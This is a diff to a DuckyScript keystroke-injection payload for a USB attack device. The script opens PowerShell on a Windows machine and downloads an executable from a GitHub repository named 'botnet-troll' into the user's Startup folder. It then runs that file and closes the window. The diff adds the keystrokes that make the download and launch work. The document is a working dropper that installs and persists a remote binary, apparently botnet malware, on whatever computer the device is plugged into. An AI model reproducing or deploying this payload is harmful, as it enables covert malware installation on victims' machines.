@@ -1,7 +1,14 @@
 GUI r
-STRING $webclient = New-Object System.Net.WebClient
 DELAY 1000
-STRING $webclient.DownloadFile("https://github.com/Hamy-os/botnet-troll/blob/main/output/main.exe?raw=true", "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe")
+STRING powershell
+ENTER
+DELAY 500
+STRING $webclient = New-Object System.Net.WebClient
+ENTER
+DELAY 2000
+STRING $webclient.DownloadFile("https://github.com/Hamy-os/botnet-troll/blob/main/output/main.exe", "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe")
+ENTER
 DELAY 3000
 STRING Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe"
-ALT F4
+ENTER
+ALT SPACE C
